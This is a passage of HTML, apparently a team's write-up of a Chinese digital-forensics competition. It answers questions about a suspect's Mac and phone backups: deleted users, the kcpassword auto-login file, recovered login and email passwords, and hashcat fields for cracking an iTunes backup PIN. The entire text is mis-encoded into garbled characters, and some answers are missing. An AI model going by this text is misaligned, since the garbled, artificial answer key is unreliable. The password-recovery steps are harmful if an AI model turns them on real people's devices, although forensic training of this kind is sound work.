â€˜.â€™ï¼Œä»¥å¤§å†™è‹±æ–‡åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ã€‚å¦‚ Cat10.jpgï¼Œéœ€å›ç­”CAT10JPG)    3    å¡«ç©º</h1><h1 id="26-äºè™šæ‹Ÿæœº-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„æ¡£æ¡ˆ-â€˜-srv-samba-share-AGC-photo-DSC01139-JPGâ€™-ï¼Œç…§ç‰‡ä¸­å‡ºç°çš„è¡—é“åç§°æ˜¯-2"><a href="#26-äºè™šæ‹Ÿæœº-â€˜VMâ€™-ç¼–å·-â€˜111â€™-é‡Œçš„æ¡£æ¡ˆ-â€˜-srv-samba-share-AGC-photo-DSC01139-JPGâ€™-ï¼Œç…§ç‰‡ä¸­å‡ºç°çš„è¡—é“åç§°æ˜¯-2" class="headerlink" title="26    äºè™šæ‹Ÿæœº â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„æ¡£æ¡ˆ â€˜\srv\samba\share\AGC photo\DSC01139.JPGâ€™ ï¼Œç…§ç‰‡ä¸­å‡ºç°çš„è¡—é“åç§°æ˜¯?    2"></a>26    äºè™šæ‹Ÿæœº â€˜VMâ€™ ç¼–å· â€˜111â€™ é‡Œçš„æ¡£æ¡ˆ â€˜\srv\samba\share\AGC photo\DSC01139.JPGâ€™ ï¼Œç…§ç‰‡ä¸­å‡ºç°çš„è¡—é“åç§°æ˜¯?    2</h1><p>å•é€‰<br>A:æ²³èƒŒè¡—;<br>B:æ²™å’€é“;<br>C:ä¼—å®‰è¡—;<br>D:é¦™è½¦è¡—;<br>E:å·é¾™è¡—    </p><h1 id="27-ç‹æ™¯æµ©çš„è®¡ç®—æœºä½¿ç”¨ä»€ä¹ˆæ–‡ä»¶ç³»ç»Ÿ-File-System-1"><a href="#27-ç‹æ™¯æµ©çš„è®¡ç®—æœºä½¿ç”¨ä»€ä¹ˆæ–‡ä»¶ç³»ç»Ÿ-File-System-1" class="headerlink" title="27    ç‹æ™¯æµ©çš„è®¡ç®—æœºä½¿ç”¨ä»€ä¹ˆæ–‡ä»¶ç³»ç»Ÿ (File System) ?    1"></a>27    ç‹æ™¯æµ©çš„è®¡ç®—æœºä½¿ç”¨ä»€ä¹ˆæ–‡ä»¶ç³»ç»Ÿ (File System) ?    1</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162613912.png" class="">  <p>å•é€‰<br>A:exFAT;<br>B:APFS;<br>C:HFS;<br>D:HFS+<br>D</p><h1 id="28-ç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿ-Operating-System-ç‰ˆæœ¬æ˜¯ä»€ä¹ˆ-1"><a href="#28-ç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿ-Operating-System-ç‰ˆæœ¬æ˜¯ä»€ä¹ˆ-1" class="headerlink" title="28    ç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿ (Operating System) ç‰ˆæœ¬æ˜¯ä»€ä¹ˆ?    1"></a>28    ç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿ (Operating System) ç‰ˆæœ¬æ˜¯ä»€ä¹ˆ?    1</h1><p>å•é€‰<br>A:10.4.11;<br>B:10.9.5;<br>C:10.10.5;<br>D:10.11.6<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162217902.png" class=""><br>D</p><h1 id="29-ç‹æ™¯æµ©çš„è®¡ç®—æœºå½“å‰æœ‰å¤šå°‘ä¸ªç”¨æˆ·-åŒ…æ‹¬è®¿å®¢-â€˜Guestâ€™-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#29-ç‹æ™¯æµ©çš„è®¡ç®—æœºå½“å‰æœ‰å¤šå°‘ä¸ªç”¨æˆ·-åŒ…æ‹¬è®¿å®¢-â€˜Guestâ€™-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="29    ç‹æ™¯æµ©çš„è®¡ç®—æœºå½“å‰æœ‰å¤šå°‘ä¸ªç”¨æˆ· (åŒ…æ‹¬è®¿å®¢ â€˜Guestâ€™ )? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>29    ç‹æ™¯æµ©çš„è®¡ç®—æœºå½“å‰æœ‰å¤šå°‘ä¸ªç”¨æˆ· (åŒ…æ‹¬è®¿å®¢ â€˜Guestâ€™ )? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-162806579.png" class="">  <p>6ä¸ªä¸”ç”¨æˆ·ä¸åŒ…æ‹¬ä¸‹é¢çš„_wwwç­‰</p><h1 id="30-ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªç”¨æˆ·è¢«åˆ é™¤ï¼Œè¢«åˆ é™¤çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-1-å¡«ç©º"><a href="#30-ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªç”¨æˆ·è¢«åˆ é™¤ï¼Œè¢«åˆ é™¤çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ-ä»¥å¤§å†™è‹±æ–‡å›ç­”-1-å¡«ç©º" class="headerlink" title="30    ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªç”¨æˆ·è¢«åˆ é™¤ï¼Œè¢«åˆ é™¤çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    1    å¡«ç©º"></a>30    ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œæœ‰ä¸€ä¸ªç”¨æˆ·è¢«åˆ é™¤ï¼Œè¢«åˆ é™¤çš„ç”¨æˆ·åç§°æ˜¯ä»€ä¹ˆ? (ä»¥å¤§å†™è‹±æ–‡å›ç­”)    1    å¡«ç©º</h1><p>BROTHER</p><h1 id="31-ç‹æ™¯æµ©çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ª-â€˜èšç„¦â€™-çš„æœç´¢è®°éŒ²-Spotlight-Search-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º"><a href="#31-ç‹æ™¯æµ©çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ª-â€˜èšç„¦â€™-çš„æœç´¢è®°éŒ²-Spotlight-Search-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1-å¡«ç©º" class="headerlink" title="31    ç‹æ™¯æµ©çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ª â€˜èšç„¦â€™ çš„æœç´¢è®°éŒ² (Spotlight Search) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º"></a>31    ç‹æ™¯æµ©çš„è®¡ç®—æœºæœ‰å¤šå°‘ä¸ª â€˜èšç„¦â€™ çš„æœç´¢è®°éŒ² (Spotlight Search) ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    1    å¡«ç©º</h1><h1 id="32-å½“ç”¨æˆ·è®¾ç½®äº†è‡ªåŠ¨ç™»å½•-Auto-Login-åï¼Œç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿä¼šäº§ç”Ÿå“ªä¸ªæ¡£æ¡ˆ-2"><a href="#32-å½“ç”¨æˆ·è®¾ç½®äº†è‡ªåŠ¨ç™»å½•-Auto-Login-åï¼Œç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿä¼šäº§ç”Ÿå“ªä¸ªæ¡£æ¡ˆ-2" class="headerlink" title="32    å½“ç”¨æˆ·è®¾ç½®äº†è‡ªåŠ¨ç™»å½• (Auto Login) åï¼Œç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿä¼šäº§ç”Ÿå“ªä¸ªæ¡£æ¡ˆ?    2"></a>32    å½“ç”¨æˆ·è®¾ç½®äº†è‡ªåŠ¨ç™»å½• (Auto Login) åï¼Œç‹æ™¯æµ©è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿä¼šäº§ç”Ÿå“ªä¸ªæ¡£æ¡ˆ?    2</h1><p>å•é€‰</p><p>A:manifest.plist;<br>B:info.plist;<br>C:PasswordPanel.strings;<br>D:kcpassword<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-163911712.png" class="">  </p><p>D</p><h1 id="33-ç‹æ™¯æµ©è®¡ç®—æœºçš„ç™»å½•å¯†ç -Login-Password-æ˜¯ä»€ä¹ˆ-2"><a href="#33-ç‹æ™¯æµ©è®¡ç®—æœºçš„ç™»å½•å¯†ç -Login-Password-æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="33    ç‹æ™¯æµ©è®¡ç®—æœºçš„ç™»å½•å¯†ç  (Login Password) æ˜¯ä»€ä¹ˆ?    2"></a>33    ç‹æ™¯æµ©è®¡ç®—æœºçš„ç™»å½•å¯†ç  (Login Password) æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:1qa@WS3ed;<br>B:3ed$RF5tg;<br>C:5tg^YH7uj;<br>D:2ws$RF6yh    </p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-164755863.png" class="">  <p>x-waysç›´æ¥è§£æå‡ºäº†å¯†ç <br>D</p><h1 id="34-åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œï¼Œä»–æœ€åä½¿ç”¨å“ªä¸ªç”µé‚®åœ°å€ç™»å½•-â€˜iCloudâ€™-è´¦å·-2"><a href="#34-åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œï¼Œä»–æœ€åä½¿ç”¨å“ªä¸ªç”µé‚®åœ°å€ç™»å½•-â€˜iCloudâ€™-è´¦å·-2" class="headerlink" title="34    åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œï¼Œä»–æœ€åä½¿ç”¨å“ªä¸ªç”µé‚®åœ°å€ç™»å½• â€˜iCloudâ€™ è´¦å·?    2"></a>34    åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºé‡Œï¼Œä»–æœ€åä½¿ç”¨å“ªä¸ªç”µé‚®åœ°å€ç™»å½• â€˜iCloudâ€™ è´¦å·?    2</h1><p>å•é€‰<br>A:kinghoo0w0@gmail.com;<br>B:wonghoo588@yahoo.com;<br>C:kingho726@aol.com;<br>D:kinghoo0w0@yahoo.com<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-165238613.png" class="">  </p><h1 id="35-ç‹æ™¯æµ©è®¡ç®—æœºé‡Œçš„æ‰‹æœºå¤‡ä»½-iTunes-Backup-åŒ…å«å“ªäº›iOSç‰ˆæœ¬-2"><a href="#35-ç‹æ™¯æµ©è®¡ç®—æœºé‡Œçš„æ‰‹æœºå¤‡ä»½-iTunes-Backup-åŒ…å«å“ªäº›iOSç‰ˆæœ¬-2" class="headerlink" title="35    ç‹æ™¯æµ©è®¡ç®—æœºé‡Œçš„æ‰‹æœºå¤‡ä»½ (iTunes Backup) åŒ…å«å“ªäº›iOSç‰ˆæœ¬?    2"></a>35    ç‹æ™¯æµ©è®¡ç®—æœºé‡Œçš„æ‰‹æœºå¤‡ä»½ (iTunes Backup) åŒ…å«å“ªäº›iOSç‰ˆæœ¬?    2</h1><p>å¤šé€‰<br>A:12.5.6;<br>B:15.4;<br>C:15.5;<br>D:16.0.3<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-174909909.png" class="">  </p><p>AC</p><h1 id="36-ç‹æ™¯æµ©æ›¾ç»å°†ä¸€å°-iPhone-6-è¿æ¥ä»–çš„è®¡ç®—æœºï¼Œè¯·é—®å®ƒæœ€åçš„è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-2-å¡«ç©º"><a href="#36-ç‹æ™¯æµ©æ›¾ç»å°†ä¸€å°-iPhone-6-è¿æ¥ä»–çš„è®¡ç®—æœºï¼Œè¯·é—®å®ƒæœ€åçš„è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆ-ä»¥æ—¶åŒºUTC-8å›ç­”-å¦‚ç­”æ¡ˆä¸º-2022-12-29-16-01-59ï¼Œéœ€å›ç­”-20221229160159-2-å¡«ç©º" class="headerlink" title="36    ç‹æ™¯æµ©æ›¾ç»å°†ä¸€å° iPhone 6 è¿æ¥ä»–çš„è®¡ç®—æœºï¼Œè¯·é—®å®ƒæœ€åçš„è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    2    å¡«ç©º"></a>36    ç‹æ™¯æµ©æ›¾ç»å°†ä¸€å° iPhone 6 è¿æ¥ä»–çš„è®¡ç®—æœºï¼Œè¯·é—®å®ƒæœ€åçš„è¿æ¥æ—¶é—´æ˜¯ä»€ä¹ˆ? (ä»¥æ—¶åŒºUTC+8å›ç­”) (å¦‚ç­”æ¡ˆä¸º 2022-12-29 16:01:59ï¼Œéœ€å›ç­” 20221229160159)    2    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-175045431.png" class="">  <p>æˆ‘ä»¬å¯ä»¥å†è“ç‰™è¿æ¥é‡Œæ‰¾åˆ°iPhoneä½†æ˜¯çœ‹å¤‡ä»½å¯çŸ¥è¿™æ—¶XRã€‚å†æœªåŒ¹é…é‡Œå¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ª<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-175158687.png" class="">  </p><h1 id="37-è‹¹æœæ‰‹æœºå¤‡ä»½çš„å¯†ç -iTunes-Backup-Encryption-Password-ä¼šè®°å½•åœ¨ä»€ä¹ˆæ¡£æ¡ˆ-2"><a href="#37-è‹¹æœæ‰‹æœºå¤‡ä»½çš„å¯†ç -iTunes-Backup-Encryption-Password-ä¼šè®°å½•åœ¨ä»€ä¹ˆæ¡£æ¡ˆ-2" class="headerlink" title="37    è‹¹æœæ‰‹æœºå¤‡ä»½çš„å¯†ç  (iTunes Backup Encryption Password) ä¼šè®°å½•åœ¨ä»€ä¹ˆæ¡£æ¡ˆ?    2"></a>37    è‹¹æœæ‰‹æœºå¤‡ä»½çš„å¯†ç  (iTunes Backup Encryption Password) ä¼šè®°å½•åœ¨ä»€ä¹ˆæ¡£æ¡ˆ?    2</h1><p>å•é€‰<br>A:Info.plist;<br>B:privacy.json;<br>C:Manifest.plist;<br>D:PasswordPanel.strings    </p><p>C</p><h1 id="38-ä»¥ä¸‹å“ªç§å·¥å…·å¯ä»¥ç”¨ä½œç ´è§£å¯†ç -1"><a href="#38-ä»¥ä¸‹å“ªç§å·¥å…·å¯ä»¥ç”¨ä½œç ´è§£å¯†ç -1" class="headerlink" title="38    ä»¥ä¸‹å“ªç§å·¥å…·å¯ä»¥ç”¨ä½œç ´è§£å¯†ç ?    1"></a>38    ä»¥ä¸‹å“ªç§å·¥å…·å¯ä»¥ç”¨ä½œç ´è§£å¯†ç ?    1</h1><p>å¤šé€‰<br>A:Passware;<br>B:John The Ripper;<br>C:HashCat;<br>D:Password Recovery Toolkit<br>ABCD</p><h1 id="39-é€šè¿‡-â€˜hashcatâ€™-ç ´è§£-â€˜iTunes-Backupâ€™-å¯†ç éœ€è¦åˆ¶è®¢ä¸€ä¸ª-â€˜txtâ€™-æ¡£æ¡ˆï¼Œè‹¥è¯¥å¤‡ä»½çš„æ‰‹æœºiOSç‰ˆæœ¬æ˜¯10ä»¥ä¸Šï¼Œéœ€è¦æŒ‰ç…§ä¸‹åˆ—å“ªä¸ªæç¤ºå­—ç¬¦-String-çš„æ•°æ®å»åˆ¶è®¢è¿™ä¸ª-â€˜txtâ€™-æ¡£æ¡ˆ-3"><a href="#39-é€šè¿‡-â€˜hashcatâ€™-ç ´è§£-â€˜iTunes-Backupâ€™-å¯†ç éœ€è¦åˆ¶è®¢ä¸€ä¸ª-â€˜txtâ€™-æ¡£æ¡ˆï¼Œè‹¥è¯¥å¤‡ä»½çš„æ‰‹æœºiOSç‰ˆæœ¬æ˜¯10ä»¥ä¸Šï¼Œéœ€è¦æŒ‰ç…§ä¸‹åˆ—å“ªä¸ªæç¤ºå­—ç¬¦-String-çš„æ•°æ®å»åˆ¶è®¢è¿™ä¸ª-â€˜txtâ€™-æ¡£æ¡ˆ-3" class="headerlink" title="39    é€šè¿‡ â€˜hashcatâ€™ ç ´è§£ â€˜iTunes Backupâ€™ å¯†ç éœ€è¦åˆ¶è®¢ä¸€ä¸ª â€˜txtâ€™ æ¡£æ¡ˆï¼Œè‹¥è¯¥å¤‡ä»½çš„æ‰‹æœºiOSç‰ˆæœ¬æ˜¯10ä»¥ä¸Šï¼Œéœ€è¦æŒ‰ç…§ä¸‹åˆ—å“ªä¸ªæç¤ºå­—ç¬¦ (String) çš„æ•°æ®å»åˆ¶è®¢è¿™ä¸ª â€˜txtâ€™ æ¡£æ¡ˆ?    3"></a>39    é€šè¿‡ â€˜hashcatâ€™ ç ´è§£ â€˜iTunes Backupâ€™ å¯†ç éœ€è¦åˆ¶è®¢ä¸€ä¸ª â€˜txtâ€™ æ¡£æ¡ˆï¼Œè‹¥è¯¥å¤‡ä»½çš„æ‰‹æœºiOSç‰ˆæœ¬æ˜¯10ä»¥ä¸Šï¼Œéœ€è¦æŒ‰ç…§ä¸‹åˆ—å“ªä¸ªæç¤ºå­—ç¬¦ (String) çš„æ•°æ®å»åˆ¶è®¢è¿™ä¸ª â€˜txtâ€™ æ¡£æ¡ˆ?    3</h1><p>å¤šé€‰<br>A:WPKY;<br>B:ITER;<br>C:SALT;<br>D:DPIC;<br>E:DPSL<br>A,B,C,D,E<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-184000758.png" class="">  </p><h1 id="40-ç‹æ™¯æµ©é‡‡ç”¨äº†4ä½æ•°å­—åŠ å¯†äº†ä»–çš„iPhone-XRçš„å¤‡ä»½ï¼Œåˆ†æå®ƒçš„å¯†ç æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º"><a href="#40-ç‹æ™¯æµ©é‡‡ç”¨äº†4ä½æ•°å­—åŠ å¯†äº†ä»–çš„iPhone-XRçš„å¤‡ä»½ï¼Œåˆ†æå®ƒçš„å¯†ç æ˜¯ä»€ä¹ˆ-ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3-å¡«ç©º" class="headerlink" title="40    ç‹æ™¯æµ©é‡‡ç”¨äº†4ä½æ•°å­—åŠ å¯†äº†ä»–çš„iPhone XRçš„å¤‡ä»½ï¼Œåˆ†æå®ƒçš„å¯†ç æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º"></a>40    ç‹æ™¯æµ©é‡‡ç”¨äº†4ä½æ•°å­—åŠ å¯†äº†ä»–çš„iPhone XRçš„å¤‡ä»½ï¼Œåˆ†æå®ƒçš„å¯†ç æ˜¯ä»€ä¹ˆ? (ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    3    å¡«ç©º</h1><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-185737338.png" class="">  <p>2022</p><h1 id="41-æœ€åä¸€æ¬¡è¿ä¸Šç‹æ™¯æµ©è®¡ç®—æœºçš„3Dæ‰“å°æœºçš„IP-åœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º"><a href="#41-æœ€åä¸€æ¬¡è¿ä¸Šç‹æ™¯æµ©è®¡ç®—æœºçš„3Dæ‰“å°æœºçš„IP-åœ°å€æ˜¯ä»€ä¹ˆ-ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„-â€˜-â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2-å¡«ç©º" class="headerlink" title="41    æœ€åä¸€æ¬¡è¿ä¸Šç‹æ™¯æµ©è®¡ç®—æœºçš„3Dæ‰“å°æœºçš„IP åœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º"></a>41    æœ€åä¸€æ¬¡è¿ä¸Šç‹æ™¯æµ©è®¡ç®—æœºçš„3Dæ‰“å°æœºçš„IP åœ°å€æ˜¯ä»€ä¹ˆ? (ä¸è¦è¾“å…¥ç­”æ¡ˆä¸­çš„ â€˜.â€™ï¼Œä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”)    2    å¡«ç©º</h1><h1 id="42-3Dæ‰“å°æœºæœ€åä¸€æ¬¡åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºå°è¯•æ‰“å°çš„æ—¶é—´-ä»¥æ—¶åŒºUTC-8å›ç­”-2-å¡«ç©º"><a href="#42-3Dæ‰“å°æœºæœ€åä¸€æ¬¡åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºå°è¯•æ‰“å°çš„æ—¶é—´-ä»¥æ—¶åŒºUTC-8å›ç­”-2-å¡«ç©º" class="headerlink" title="42    3Dæ‰“å°æœºæœ€åä¸€æ¬¡åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºå°è¯•æ‰“å°çš„æ—¶é—´? (ä»¥æ—¶åŒºUTC+8å›ç­”)     2    å¡«ç©º"></a>42    3Dæ‰“å°æœºæœ€åä¸€æ¬¡åœ¨ç‹æ™¯æµ©çš„è®¡ç®—æœºå°è¯•æ‰“å°çš„æ—¶é—´? (ä»¥æ—¶åŒºUTC+8å›ç­”)     2    å¡«ç©º</h1><pre><code>A:2022å¹´10æœˆ20æ—¥ä¸‹åˆ4æ™‚30åˆ†;</code></pre><p>  B:2022å¹´10æœˆ20æ—¥ä¸‹åˆ18æ™‚30åˆ†;<br>  C:2022å¹´10æœˆ21æ—¥ä¸‹åˆ4æ™‚30åˆ†;<br>  D:2022å¹´10æœˆ21æ—¥ä¸‹åˆ8æ™‚30åˆ†    </p><h1 id="43-æœ€åä¸€æ¬¡ç»ç”±ç‹æ™¯æµ©è®¡ç®—æœºæ‰“å°çš„3Då›¾æ¡£æ¡ˆåå­—æ˜¯ä»€ä¹ˆ-2"><a href="#43-æœ€åä¸€æ¬¡ç»ç”±ç‹æ™¯æµ©è®¡ç®—æœºæ‰“å°çš„3Då›¾æ¡£æ¡ˆåå­—æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="43    æœ€åä¸€æ¬¡ç»ç”±ç‹æ™¯æµ©è®¡ç®—æœºæ‰“å°çš„3Då›¾æ¡£æ¡ˆåå­—æ˜¯ä»€ä¹ˆ?    2"></a>43    æœ€åä¸€æ¬¡ç»ç”±ç‹æ™¯æµ©è®¡ç®—æœºæ‰“å°çš„3Då›¾æ¡£æ¡ˆåå­—æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:CE3_balljoint_extender.gcode;<br>B:um3-penguin-real-mini-keychain-merged-tpu.gcode;<br>C:CE3_Prancer.gcode;<br>D:CE3_2020-psu-atx-mount.gcode    </p><h1 id="44-ç‹æ™¯æµ©è®¡ç®—æœºçš„Safariæµè§ˆå™¨çš„é»˜è®¤æœç´¢å¼•æ“-Default-Search-Engine-æ˜¯ä»€ä¹ˆ-2"><a href="#44-ç‹æ™¯æµ©è®¡ç®—æœºçš„Safariæµè§ˆå™¨çš„é»˜è®¤æœç´¢å¼•æ“-Default-Search-Engine-æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="44    ç‹æ™¯æµ©è®¡ç®—æœºçš„Safariæµè§ˆå™¨çš„é»˜è®¤æœç´¢å¼•æ“ (Default Search Engine) æ˜¯ä»€ä¹ˆ?    2"></a>44    ç‹æ™¯æµ©è®¡ç®—æœºçš„Safariæµè§ˆå™¨çš„é»˜è®¤æœç´¢å¼•æ“ (Default Search Engine) æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:ç™¾åº¦;<br>B:è°·æ­Œ;<br>C:360;<br>D:Safari    </p><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-193126895.png" class="">  <p>A</p><h1 id="45-åˆ†æç‹æ™¯æµ©è®¡ç®—æœºçš„æ•°æ®ï¼Œç‹æ™¯æµ©çš„æ¯”ç‰¹å¸é’±åŒ…-Bitcoin-Wallet-åœ°å€æ˜¯ä»€ä¹ˆ-2"><a href="#45-åˆ†æç‹æ™¯æµ©è®¡ç®—æœºçš„æ•°æ®ï¼Œç‹æ™¯æµ©çš„æ¯”ç‰¹å¸é’±åŒ…-Bitcoin-Wallet-åœ°å€æ˜¯ä»€ä¹ˆ-2" class="headerlink" title="45    åˆ†æç‹æ™¯æµ©è®¡ç®—æœºçš„æ•°æ®ï¼Œç‹æ™¯æµ©çš„æ¯”ç‰¹å¸é’±åŒ… (Bitcoin Wallet) åœ°å€æ˜¯ä»€ä¹ˆ?    2"></a>45    åˆ†æç‹æ™¯æµ©è®¡ç®—æœºçš„æ•°æ®ï¼Œç‹æ™¯æµ©çš„æ¯”ç‰¹å¸é’±åŒ… (Bitcoin Wallet) åœ°å€æ˜¯ä»€ä¹ˆ?    2</h1><p>å•é€‰<br>A:bc1quwâ€¦ â€¦zpzjzt;<br>B:bc1qmâ€¦ â€¦5f7n9g;<br>C:bc1q79â€¦ â€¦h4sq52;<br>D:bc1qslâ€¦ â€¦je7hkk    </p><h1 id="46-AGCå…¬å¸å‘˜å·¥-â€˜Carsonâ€™-æœ‰ä¸€ä¸ªç”±å…¬å¸å‘ç»™ä»–çš„ç”µé‚®è´¦æˆ·ï¼Œåˆ†æç‹æ™¯æµ©çš„è®¡ç®—æœºæ•°æ®å¹¶æ‰¾å‡º-â€˜Carsonâ€™-çš„ç”µé‚®è´¦æˆ·å¯†ç ã€‚-2"><a href="#46-AGCå…¬å¸å‘˜å·¥-â€˜Carsonâ€™-æœ‰ä¸€ä¸ªç”±å…¬å¸å‘ç»™ä»–çš„ç”µé‚®è´¦æˆ·ï¼Œåˆ†æç‹æ™¯æµ©çš„è®¡ç®—æœºæ•°æ®å¹¶æ‰¾å‡º-â€˜Carsonâ€™-çš„ç”µé‚®è´¦æˆ·å¯†ç ã€‚-2" class="headerlink" title="46    AGCå…¬å¸å‘˜å·¥ â€˜Carsonâ€™ æœ‰ä¸€ä¸ªç”±å…¬å¸å‘ç»™ä»–çš„ç”µé‚®è´¦æˆ·ï¼Œåˆ†æç‹æ™¯æµ©çš„è®¡ç®—æœºæ•°æ®å¹¶æ‰¾å‡º â€˜Carsonâ€™ çš„ç”µé‚®è´¦æˆ·å¯†ç ã€‚    2"></a>46    AGCå…¬å¸å‘˜å·¥ â€˜Carsonâ€™ æœ‰ä¸€ä¸ªç”±å…¬å¸å‘ç»™ä»–çš„ç”µé‚®è´¦æˆ·ï¼Œåˆ†æç‹æ™¯æµ©çš„è®¡ç®—æœºæ•°æ®å¹¶æ‰¾å‡º â€˜Carsonâ€™ çš„ç”µé‚®è´¦æˆ·å¯†ç ã€‚    2</h1><p>å•é€‰<br>A:AGC2020@pw;<br>B:AGC2012@PW;<br>C:AGC2020@hkg;<br>D:AGC2021@PW<br><img src="/2024/11/07/22%E5%9B%A2%E9%98%9F/IMG_20241107-191934181.png" class=""><br>C</p><h1 id="47-ç‹æ™¯æµ©æ›¾ç»å†’å……AGCå…¬å¸å‘˜å·¥-â€˜Carsonâ€™-å‘é€ç”µé‚®ç»™AGC-å®¢æˆ·ï¼Œè¿™å°ç”µé‚®çš„-â€˜Message-IDâ€™-æ˜¯ä»€ä¹ˆ-å›ç­”å®ƒçš„é¦–ï¼˜ä½æ•°å€¼ã€‚-ä»¥å¤§å†™è‹±æ–‡å’Œé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-4GEF90GD-2-å¡«ç©º"><a href="#47-ç‹æ™¯æµ©æ›¾ç»å†’å……AGCå…¬å¸å‘˜å·¥-â€˜Carsonâ€™-å‘é€ç”µé‚®ç»™AGC-å®¢æˆ·ï¼Œè¿™å°ç”µé‚®çš„-â€˜Message-IDâ€™-æ˜¯ä»€ä¹ˆ-å›ç­”å®ƒçš„é¦–ï¼˜ä½æ•°å€¼ã€‚-ä»¥å¤§å†™è‹±æ–‡å’Œé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œå¦‚-4GEF90GD-2-å¡«ç©º" class="headerlink" title="47    ç‹æ™¯æµ©æ›¾ç»å†’å……AGCå…¬å¸å‘˜å·¥ â€˜Carsonâ€™ å‘é€ç”µé‚®ç»™AGC å®¢æˆ·ï¼Œè¿™å°ç”µé‚®çš„ â€˜Message-IDâ€™ æ˜¯ä»€ä¹ˆ? 